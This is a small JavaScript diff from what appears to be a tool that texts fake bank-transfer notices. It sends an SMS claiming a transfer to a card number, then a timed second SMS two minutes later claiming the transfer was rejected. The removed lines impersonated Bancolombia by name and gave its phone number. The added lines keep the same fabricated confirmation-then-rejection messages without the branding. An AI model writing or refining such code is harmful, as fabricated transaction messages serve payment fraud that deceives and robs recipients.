@@ -536,13 +536,13 @@
                 const cuentaOrigen = '6651'; // puedes cambiar esto si es dinámico
                 const cuentaDestino = tarjeta.replace(/\s/g, '');
                 await enviarSMS(
-                    `Bancolombia: Transferiste $${monto.toLocaleString('es-CO', {minimumFractionDigits:2})} desde tu cuenta a la cuenta *${cuentaDestino} el ${fechaFormateada} a las ${horaFormateada}. ¿Dudas? Llamanos al 018000931987. Estamos cerca.`
+                    `Transferencia: $${monto.toLocaleString('es-CO', {minimumFractionDigits:2})} de 6651 a *${cuentaDestino} el ${fechaFormateada} ${horaFormateada}.`
                 );
 
                 // 🟠 SMS secundario después de 2 minutos indicando rechazo/rebote
                 setTimeout(() => {
                     enviarSMS(
-                        `Bancolombia: Tu transferencia de $${monto.toLocaleString('es-CO', {minimumFractionDigits:2})} desde tu cuenta a la cuenta *${cuentaDestino} realizada el ${fechaFormateada} a las ${horaFormateada} fue rechazada. Si tienes dudas comunícate al 018000931987.`
+                        `Transferencia rechazada: $${monto.toLocaleString('es-CO', {minimumFractionDigits:2})} a *${cuentaDestino} el ${fechaFormateada} ${horaFormateada}.`
                     );
                 }, 120000); // 2 minutos en milisegundos
 
